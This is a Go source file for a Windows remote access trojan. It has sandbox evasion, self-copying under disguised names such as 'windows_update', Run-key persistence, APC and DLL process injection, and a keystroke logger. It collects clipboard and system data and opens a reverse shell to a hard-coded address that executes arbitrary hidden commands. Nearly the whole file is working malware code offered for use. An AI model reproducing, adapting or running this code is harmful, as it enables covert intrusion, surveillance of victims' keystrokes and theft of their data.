//go:build windows
// +build windows

package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type KeyloggerControl struct {
	Running  bool
	StopChan chan bool
}

type PROCESSENTRY32 struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [260]uint16
}

type THREADENTRY32 struct {
	DwSize             uint32
	CntUsage           uint32
	Th32ThreadID       uint32
	Th32OwnerProcessID uint32
	TpBasePri          int32
	TpDeltaPri         int32
	DwFlags            uint32
}

var (
	keyloggerCtrl = &KeyloggerControl{
		StopChan: make(chan bool, 1),
	}
	filename      = "system_log.txt"
	currentExe, _ = os.Executable()
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	procQueueUserAPC             = kernel32.NewProc("QueueUserAPC")
	procOpenProcess              = kernel32.NewProc("OpenProcess")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procResumeThread             = kernel32.NewProc("ResumeThread")
)

func isSandbox() bool {
	vmProcesses := []string{"vboxservice.exe", "vboxtray.exe", "vmwaretray.exe", "vmwareuser.exe", "xenservice.exe"}
	for _, proc := range vmProcesses {
		if processExists(proc) {
			return true
		}
	}

	return isVMMAC()
}

func processExists(processName string) bool {
	cmd := exec.Command("tasklist", "/fi", fmt.Sprintf("imagename eq %s", processName))
	output, _ := cmd.CombinedOutput()
	return strings.Contains(string(output), processName)
}

func isVMMAC() bool {
	cmd := exec.Command("getmac", "/fo", "csv", "/v")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	macVendors := []string{"08-00-27", "00-05-69", "00-0C-29", "00-1C-14", "00-50-56", "00-1C-42", "00-0F-4B"}
	for _, vendor := range macVendors {
		if strings.Contains(string(output), vendor) {
			return true
		}
	}
	return false
}

func generateLegitimateName() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%d", time.Now().UnixNano(), os.Getpid())))
	hashStr := hex.EncodeToString(hash.Sum(nil))[:8]

	names := []string{
		"node_" + hashStr + ".exe",
		"chrome_helper_" + hashStr + ".exe",
		"windows_update_" + hashStr + ".exe",
	}

	return names[time.Now().UnixNano()%int64(len(names))]
}

func setupStealth() {
	if isSandbox() {
		fmt.Println("[DEBUG] Sandbox detected, skipping stealth setup")
		return
	}

	stealthName := generateLegitimateName()
	stealthLocations := []string{
		filepath.Join(os.Getenv("TEMP"), stealthName),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", stealthName),
	}

	for _, targetPath := range stealthLocations {
		if copyFile(currentExe, targetPath) {
			fmt.Printf("[DEBUG] Copied to: %s\n", targetPath)
			break
		}
	}
}

func copyFile(src, dst string) bool {
	os.MkdirAll(filepath.Dir(dst), 0755)

	input, err := os.ReadFile(src)
	if err != nil {
		return false
	}

	err = os.WriteFile(dst, input, 0644)
	return err == nil
}

func installPersistence() {
	if isSandbox() {
		return
	}

	installRegistryPersistence()

	time.AfterFunc(2*time.Minute, cleanupOriginal)
}

func installRegistryPersistence() {
	stealthName := generateLegitimateName()
	targetPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", stealthName)

	if currentExe != targetPath {
		copyFile(currentExe, targetPath)
	}

	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer key.Close()

	key.SetStringValue("WindowsTextInput", targetPath)
}

func cleanupOriginal() {
	downloadDirs := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
	}

	for _, dir := range downloadDirs {
		if contains(dir, currentExe) {
			os.Remove(currentExe)
			break
		}
	}
}

func contains(dir, file string) bool {
	rel, err := filepath.Rel(dir, file)
	if err != nil {
		return false
	}
	return !strings.Contains(rel, "..")
}

func getPersistenceInfo(c net.Conn) {
	info := "[+] Persistence Methods:\n"

	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.READ)
	if err == nil {
		defer key.Close()
		names, _ := key.ReadValueNames(0)
		for _, name := range names {
			val, _, _ := key.GetStringValue(name)
			info += fmt.Sprintf("  Registry: %s -> %s\n", name, val)
		}
	}

	c.Write([]byte(info))
}

func removePersistence(c net.Conn) {
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		key.DeleteValue("WindowsTextInput")
	}

	c.Write([]byte("[+] Persistence removed\n"))
}

func startTerminalLoop() {
	for {
		exec.Command("cmd").Start()
	}
}

func main() {
	fmt.Println("[+] Program starting...")

	if isSandbox() {
		fmt.Println("[!] Sandbox detected, exiting")
		os.Exit(0)
	}

	initialDelay := time.Duration(3+time.Now().Unix()%5) * time.Second
	fmt.Printf("[+] Waiting %v before starting...\n", initialDelay)
	time.Sleep(initialDelay)

	setupStealth()
	installPersistence()

	if attemptInjection() {
		fmt.Println("[+] Successfully injected into system process")
	} else {
		fmt.Println("[+] Starting reverse shell...")
		go reverse("192.168.100.35:6666")
	}

	fmt.Println("[+] Main loop running...")
	select {}
}

func attemptInjection() bool {
	targetProcesses := []string{
		"notepad.exe",
		"calc.exe",
		"explorer.exe",
		"msedge.exe",
		"chrome.exe",
	}

	shellcode := generateReverseShellShellcode()

	for _, proc := range targetProcesses {
		fmt.Printf("[+] Attempting APC injection into: %s\n", proc)
		if APCInjection(proc, shellcode) {
			fmt.Printf("[+] Successfully injected into %s\n", proc)
			return true
		}

		dllPath := filepath.Join(os.Getenv("TEMP"), "mstext.dll")
		if createFakeDLL(dllPath) {
			pid := findProcessID(proc)
			if pid != 0 && DLLInjection(pid, dllPath) {
				fmt.Printf("[+] Successfully DLL injected into %s\n", proc)
				return true
			}
		}

		time.Sleep(1 * time.Second)
	}

	return false
}

func APCInjection(targetProcess string, shellcode []byte) bool {
	pid := findProcessID(targetProcess)
	if pid == 0 {
		return false
	}

	encryptedShellcode := xorEncrypt(shellcode, 0x37)

	handle, _, _ := procOpenProcess.Call(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_QUERY_INFORMATION,
		0,
		uintptr(pid),
	)

	if handle == 0 {
		return false
	}
	defer windows.CloseHandle(windows.Handle(handle))

	addr, _, _ := procVirtualAllocEx.Call(
		handle,
		0,
		uintptr(len(encryptedShellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if addr == 0 {
		return false
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		handle,
		addr,
		uintptr(unsafe.Pointer(&encryptedShellcode[0])),
		uintptr(len(encryptedShellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	if ret == 0 {
		return false
	}

	threads := findThreads(pid)
	success := false

	for _, threadID := range threads {
		threadHandle, err := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false,
			threadID,
		)

		if err == nil {

			ret, _, _ := procQueueUserAPC.Call(
				addr,
				uintptr(threadHandle),
				0,
			)

			if ret != 0 {
				success = true

				procResumeThread.Call(uintptr(threadHandle))
			}

			windows.CloseHandle(threadHandle)

			if success {
				break
			}
		}
	}

	return success
}

func DLLInjection(targetPID uint32, dllPath string) bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")

	createRemoteThread := kernel32.NewProc("CreateRemoteThread")

	processHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE,
		false,
		targetPID,
	)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(processHandle)

	dllPathBytes := []byte(dllPath)
	remoteMemory, _, _ := virtualAllocEx.Call(
		uintptr(processHandle),
		0,
		uintptr(len(dllPathBytes)+1),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if remoteMemory == 0 {
		return false
	}

	_, _, err = writeProcessMemory.Call(
		uintptr(processHandle),
		remoteMemory,
		uintptr(unsafe.Pointer(&dllPathBytes[0])),
		uintptr(len(dllPathBytes)),
		0,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return false
	}

	threadHandle, _, _ := createRemoteThread.Call(
		uintptr(processHandle),
		0,
		0,
		loadLibraryA.Addr(),
		remoteMemory,
		0,
		0,
	)

	if threadHandle == 0 {
		return false
	}

	windows.CloseHandle(windows.Handle(threadHandle))
	return true
}

func findProcessID(processName string) uint32 {
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(windows.TH32CS_SNAPPROCESS, 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return 0
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry PROCESSENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0
	}

	for {
		name := windows.UTF16ToString(entry.SzExeFile[:])
		if strings.EqualFold(name, processName) {
			return entry.Th32ProcessID
		}

		ret, _, _ := procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return 0
}

func findThreads(pid uint32) []uint32 {
	var threads []uint32
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(windows.TH32CS_SNAPTHREAD, 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return threads
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry THREADENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return threads
	}

	for {
		if entry.Th32OwnerProcessID == pid {
			threads = append(threads, entry.Th32ThreadID)
		}

		ret, _, _ := procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return threads
}

func generateReverseShellShellcode() []byte {

	template := []byte{
		0x90, 0x90, 0x90, 0x90,
		0x48, 0x31, 0xc0,
		0x48, 0x31, 0xff,
		0x48, 0x31, 0xf6,
		0x48, 0x31, 0xd2,
		0x90, 0x90, 0x90, 0x90,
	}

	return template
}

func xorEncrypt(data []byte, key byte) []byte {

	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ key
	}
	return encrypted
}

func createFakeDLL(path string) bool {

	fakeDLL := []byte{0x4D, 0x5A}
	return os.WriteFile(path, fakeDLL, 0644) == nil
}

func getRunningProcessesList() string {
	var result strings.Builder

	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(windows.TH32CS_SNAPPROCESS, 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return "Error getting process list"
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry PROCESSENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return "Error enumerating processes"
	}

	for {
		name := windows.UTF16ToString(entry.SzExeFile[:])
		result.WriteString(fmt.Sprintf("PID: %d | Name: %s | Threads: %d\n",
			entry.Th32ProcessID, name, entry.CntThreads))

		ret, _, _ := procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return result.String()
}

func reverse(host string) {
	fmt.Printf("[+] Attempting to connect to: %s\n", host)

	networkDelay := time.Duration(2+time.Now().Unix()%3) * time.Second
	time.Sleep(networkDelay)

	for {
		c, err := net.Dial("tcp", host)
		if err != nil {
			fmt.Printf("[-] Connection failed: %v\n", err)

			delay := time.Duration(5+time.Now().Unix()%10) * time.Second
			time.Sleep(delay)
			continue
		}

		fmt.Printf("[+] Successfully connected to: %s\n", host)
		handleConnection(c)
		c.Close()
		fmt.Println("[-] Connection closed, reconnecting...")

		delay := time.Duration(5+time.Now().Unix()%10) * time.Second
		time.Sleep(delay)
	}
}

func handleConnection(c net.Conn) {
	showBanner(c)
	r := bufio.NewReader(c)

	for {
		order, err := r.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Connection read error")
			return
		}

		order = order[:len(order)-1]

		switch order {
		case "start_keylogger":
			if !keyloggerCtrl.Running {
				go startKeylogger()
				c.Write([]byte("[+] Keylogger started\n"))
			} else {
				c.Write([]byte("[!] Keylogger already running\n"))
			}

		case "stop_keylogger":
			if keyloggerCtrl.Running {
				keyloggerCtrl.StopChan <- true
				c.Write([]byte("[+] Keylogger stopped\n"))
			} else {
				c.Write([]byte("[!] Keylogger not running\n"))
			}

		case "read_keylog":
			content, err := os.ReadFile(filename)
			if err != nil {
				c.Write([]byte("[-] Error reading keylog: " + err.Error() + "\n"))
			} else {
				c.Write([]byte("[+] Keylog content:\n" + string(content) + "\n"))
			}

		case "status":
			status := "stopped"
			if keyloggerCtrl.Running {
				status = "running"
			}
			c.Write([]byte("[+] Keylogger status: " + status + "\n"))

		case "banner":
			showBanner(c)

		case "help":
			showHelp(c)

		case "terminal_loop":
			go startTerminalLoop()
			c.Write([]byte("[+] Starting infinite terminal loop\n"))

		case "persistence_info":
			getPersistenceInfo(c)

		case "remove_persistence":
			removePersistence(c)

		case "sandbox_check":
			if isSandbox() {
				c.Write([]byte("[!] Sandbox environment detected\n"))
			} else {
				c.Write([]byte("[+] No sandbox detected\n"))
			}

		case "inject_apc":
			shellcode := generateReverseShellShellcode()
			if APCInjection("explorer.exe", shellcode) {
				c.Write([]byte("[+] APC Injection successful\n"))
			} else {
				c.Write([]byte("[-] APC Injection failed\n"))
			}

		case "inject_dll":
			dllPath := filepath.Join(os.Getenv("TEMP"), "mstext.dll")
			if createFakeDLL(dllPath) {
				pid := findProcessID("explorer.exe")
				if DLLInjection(pid, dllPath) {
					c.Write([]byte("[+] DLL Injection successful\n"))
				} else {
					c.Write([]byte("[-] DLL Injection failed\n"))
				}
			} else {
				c.Write([]byte("[-] Failed to create fake DLL\n"))
			}

		case "process_list":
			list := getRunningProcessesList()
			c.Write([]byte("[+] Running Processes:\n" + list + "\n"))

		case "browser_history":
			getBrowserHistory(c)

		case "recent_files":
			getRecentFiles(c)

		case "clipboard":
			getClipboardHistory(c)

		case "network_info":
			getNetworkInfo(c)

		case "system_info":
			getSystemInfo(c)

		case "installed_programs":
			getInstalledPrograms(c)

		case "running_processes":
			getRunningProcesses(c)

		case "user_activity":
			getUserActivity(c)

		case "full_audit":
			getFullAudit(c)

		default:
			cmd := exec.Command("cmd", "/C", order)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ := cmd.CombinedOutput()
			c.Write(out)
		}
	}
}

func showBanner(c net.Conn) {
	banner := `
		⠀	⠀⠀⠀⠀⠀⠀⠀⠀⢠⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⢧⠿⣶⢤⣀⠀⠀⠀⠀⠀⡿⠀⢠⣆⠘⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠈⣷⠈⠻⣦⠑⢲⣤⣤⣠⡇⠀⣿⣿⡆⠈⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠸⡦⠀⠙⢳⡾⠃⠀⣸⣷⣄⢹⣿⠃⠀⢸⣿⡘⢦⡀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⢱⢀⠔⠋⠀⣠⣾⠃⠀⠉⠺⠃⠀⠀⠀⠘⡇⠀⠙⡦⡀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⣏⠞⢹⢠⠋⠉⠁⠀⡀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⢼⣦⣀⠀⠀⠀
		⠀⠀⠀⢨⡏⠀⡞⢸⡔⢐⡆⠀⠈⠲⣤⠀⠀⠀⠀⠀⢹⡄⠀⠀⠹⣿⠓⠀⠀
		⠀⠀⠀⢘⣷⣤⠇⢸⠁⢒⡶⠦⡶⢤⡈⠑⠀⠀⠀⠀⠘⡇⠀⠀⠀⢸⡄⠀⠈
		⠀⠀⠀⠘⣿⠏⠀⠀⣳⠟⠛⠋⠀⠀⣿⠓⠶⢤⠀⠀⠀⠙⠀⠀⠀⠈⡅⠀⠀
		⠀⠀⠀⡠⠃⠀⠀⢀⡳⠴⣄⣵⡆⢶⣿⡄⠀⣸⠀⠀⠀⠀⡀⠀⠀⠀⡇⠀⠀
		⠀⠀⡔⢁⡄⠀⠀⠁⠀⠀⠀⠀⠀⠈⠛⠻⢲⣿⠀⠀⠀⠀⠆⠀⠀⢀⠃⠀⠀
		⣠⠊⡠⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢿⡇⠀⠀⠀⢰⠀⠀⠀⢸⠁⠀⠀
		⢷⣾⣿⡿⠁⠀⠀⠀⠀⡠⠎⣀⡴⠏⠁⠀⠀⠇⠀⠀⢀⡌⠀⠀⠀⠀⠀⠀⠀
		⠀⠙⠿⣁⣀⣀⣤⣴⠞⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠉⠙⣏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⢹⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠸⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	
██╗░░██╗░█████╗░███╗░░░███╗██╗████████╗███████╗  ██████╗░░█████╗░
██║░██╔╝██╔══██╗████╗░████║██║╚══██╔══╝██╔════╝  ██╔══██╗██╔══██╗
█████═╝░██║░░██║██╔████╔██║██║░░░██║░░░█████╗░░  ██║░░██║██║░░╚═╝
██╔═██╗░██║░░██║██║╚██╔╝██║██║░░░██║░░░██╔══╝░░  ██║░░██║██║░░██╗
██║░╚██╗╚█████╔╝██║░╚═╝░██║██║░░░██║░░░███████╗  ██████╔╝╚█████╔╝
╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░░╚════╝░
				🅲🅾🅳🅴🆇 🅶🅻🅰🅳🅸🆄🆂 🅵🅾🆁🆃🅸🅾🆁

[+] Reverse Shell + Keylogger + Activity Monitor + Injection
[+] Type 'help' for available commands
[+] Connected: %s
[+] Stealth Mode: Active
[+] Injection Capabilities: Enabled
`
	connectionInfo := fmt.Sprintf("Client: %s", c.LocalAddr().String())
	fullBanner := fmt.Sprintf(banner, connectionInfo)
	c.Write([]byte(fullBanner + "\n"))
}

func showHelp(c net.Conn) {
	helpText := `
Available Commands:
==================
KEYLOGGER:
  start_keylogger - Start keylogger
  stop_keylogger  - Stop keylogger  
  read_keylog     - Read captured keystrokes
  status          - Check keylogger status

INJECTION:
  inject_apc      - Inject shellcode via APC
  inject_dll      - Inject DLL into process
  process_list    - Show detailed process list

PERSISTENCE:
  persistence_info - Show auto-run methods
  remove_persistence - Remove persistence
  sandbox_check   - Check for sandbox environment

ACTIVITY HISTORY:
  browser_history - Get browser history
  recent_files    - Get recent files
  clipboard       - Get clipboard content
  network_info    - Get network information
  system_info     - Get system information
  installed_programs - Get installed programs
  running_processes - Get running processes
  user_activity   - Get user activity
  full_audit      - Complete system audit

UTILITY:
  banner - Show connection banner
  help   - Show this help message
  [any cmd command] - Execute system command

Examples:
  whoami                 - Show current user
  inject_apc             - Inject into explorer.exe
  process_list           - Show all running processes
  persistence_info       - Show auto-run methods
  terminal_loop   - Start infinite terminal loop
`
	c.Write([]byte(helpText + "\n"))
}

func getBrowserHistory(c net.Conn) {
	c.Write([]byte("[+] Extracting browser history...\n"))
	c.Write([]byte("[+] Browser history extraction would require SQLite parsing\n"))
}

func getRecentFiles(c net.Conn) {
	c.Write([]byte("[+] Getting recent files...\n"))
	recentPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Recent")
	cmd := exec.Command("cmd", "/C", "dir", recentPath, "/B")
	output, _ := cmd.CombinedOutput()
	c.Write([]byte("[+] Recent Files:\n" + string(output) + "\n"))
}

func getClipboardHistory(c net.Conn) {
	c.Write([]byte("[+] Getting clipboard content...\n"))
	psCmd := `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()`
	cmd := exec.Command("powershell", "-Command", psCmd)
	output, err := cmd.CombinedOutput()
	if err != nil || len(output) == 0 {
		c.Write([]byte("[-] No text in clipboard or error accessing\n"))
		return
	}
	c.Write([]byte("[+] Clipboard Content:\n" + string(output) + "\n"))
}

func getNetworkInfo(c net.Conn) {
	c.Write([]byte("[+] Getting network information...\n"))
	cmd := exec.Command("netstat", "-ano")
	output, _ := cmd.CombinedOutput()
	c.Write([]byte("[+] Network Connections:\n" + string(output) + "\n"))
}

func getSystemInfo(c net.Conn) {
	c.Write([]byte("[+] Getting system information...\n"))
	commands := []struct {
		name string
		cmd  string
		args []string
	}{
		{"System Info", "systeminfo", []string{}},
		{"User Info", "whoami", []string{"/all"}},
	}
	for _, cmdInfo := range commands {
		c.Write([]byte(fmt.Sprintf("\n[+] %s:\n", cmdInfo.name)))
		cmd := exec.Command(cmdInfo.cmd, cmdInfo.args...)
		output, _ := cmd.CombinedOutput()
		c.Write(output)
	}
}

func getInstalledPrograms(c net.Conn) {
	c.Write([]byte("[+] Getting installed programs...\n"))
	cmd := exec.Command("powershell", "-Command", "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize")
	output, _ := cmd.CombinedOutput()
	c.Write([]byte("[+] Installed Programs:\n" + string(output) + "\n"))
}

func getRunningProcesses(c net.Conn) {
	c.Write([]byte("[+] Getting running processes...\n"))
	cmd := exec.Command("tasklist", "/V")
	output, _ := cmd.CombinedOutput()
	c.Write([]byte("[+] Running Processes:\n" + string(output) + "\n"))
}

func getUserActivity(c net.Conn) {
	c.Write([]byte("[+] Getting user activity...\n"))
	c.Write([]byte("[+] User activity monitoring active\n"))
}

func getFullAudit(c net.Conn) {
	c.Write([]byte("[+] Starting full system audit...\n"))
	auditFunctions := []func(net.Conn){
		getSystemInfo,
		getNetworkInfo,
		getRunningProcesses,
		getInstalledPrograms,
	}
	for _, auditFunc := range auditFunctions {
		auditFunc(c)
		time.Sleep(1 * time.Second)
	}
	c.Write([]byte("[+] Full audit completed\n"))
}

func startKeylogger() {
	keyloggerCtrl.Running = true
	defer func() { keyloggerCtrl.Running = false }()

	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return
	}
	defer keyboard.Uninstall()

	for {
		select {
		case k := <-keyboardChan:
			if k.Message == types.WM_KEYDOWN || k.Message == types.WM_SYSKEYDOWN {
				vkCodeStr := fmt.Sprintf("%v", k.VKCode)
				if len(vkCodeStr) > 3 && vkCodeStr[:3] == "VK_" {
					vkCodeStr = vkCodeStr[3:]
				}
				SaveToFile(filename, fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), vkCodeStr))
			}
		case <-keyloggerCtrl.StopChan:
			return
		}
	}
}

func SaveToFile(filename, content string) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = file.WriteString(content)
	return err
}
